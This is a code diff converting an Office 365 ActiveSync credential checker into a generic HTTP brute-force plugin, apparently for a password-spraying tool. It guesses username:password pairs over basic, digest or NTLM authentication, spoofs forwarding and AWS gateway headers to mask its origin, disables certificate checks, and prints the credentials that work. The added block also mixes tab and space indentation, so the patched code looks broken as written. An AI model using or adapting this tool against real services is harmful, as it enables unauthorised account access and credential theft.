@@ -1,4 +1,4 @@
-import json, datetime, requests, random
+import json, datetime, requests, random, requests_ntlm
 
 
 def generate_ip():
@@ -18,7 +18,7 @@ def generate_trace_id():
     return str + first + "-" + second
 
 
-def o365_authenticate(url, username, password, useragent, pluginargs):
+def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CHANGEME: replace template with plugin name
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
 
@@ -37,61 +37,54 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         'cookies': [],
         'sourceip' : None,
         'throttled' : False,
-		'error' : False,
+        'error' : False,
         'output' : ""
     }
-
-    INVALID_LOGIN = "INVALID_LOGIN"
-    INVALID_USER = "INVALID_USER"
-    VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
-    VALID_LOGIN = "VALID_LOGIN"
-    UNKNOWN = "UNKNOWN"
-
-    symbols = {
-        INVALID_LOGIN: "-",
-        INVALID_USER: "-",
-        VALID_PASSWD_2FA: "#",
-        VALID_LOGIN: "!",
-        UNKNOWN: "?"
-    }
-    template = "[{s}] {code} {valid} {user}:{password}"
-
 
     spoofed_ip = generate_ip()
     amazon_id = generate_id()
     trace_id = generate_trace_id()
 
-
+    # CHANGEME: Add more if necessary
     headers = {
-        "MS-ASProtocolVersion": "14.0",
         'User-Agent': useragent,
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
     }
 
+
     try:
-        r = requests.options("{}/Microsoft-Server-ActiveSync".format(url), auth=(username, password), headers=headers, timeout=30)
 
-        status = r.status_code
-        valid = ""
+        resp = None
 
-        if status == 401:
-            valid = INVALID_LOGIN
-            data_response['success'] = False
-        elif status == 404:
-            if r.headers.get("X-CasErrorCode") == "UserNotFound":
-                valid = INVALID_USER
-            data_response['success'] = False
-        elif status == 403:
-            valid = VALID_PASSWD_2FA
+        full_url = "{}/{}".format(url,pluginargs['uri'])
+
+		if pluginargs['auth'] == 'basic':
+			auth = requests.auth.HTTPBasicAuth(username, password)
+			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)
+
+		elif pluginargs['auth'] == 'digest':
+			auth = requests.auth.HTTPDigestAuth(username, password)
+			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)
+
+		elif pluginargs['auth'] == 'ntlm':
+			auth = requests_ntlm.HttpNtlmAuth(username, password)
+			resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)
+
+
+        if resp.status_code == 200:
             data_response['success'] = True
-            data_response['2fa_enabled'] = True
-        elif status == 200:
-            valid = VALID_LOGIN
-            data_response['success'] = True
+            data_response['output'] = 'SUCCESS: => {}:{}'.format(username, password)
 
-        data_response['output'] = template.format(s=symbols[valid], code=status, valid=valid, user=username, password=password)
+        elif resp.status_code == 401:
+            data_response['success'] = False
+            data_response['output'] = 'FAILURE: => {}:{}'.format(username, password)
+
+        else: #fail
+            data_response['success'] = False
+            data_response['output'] = 'UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password)
+
 
     except Exception as ex:
         data_response['error'] = True
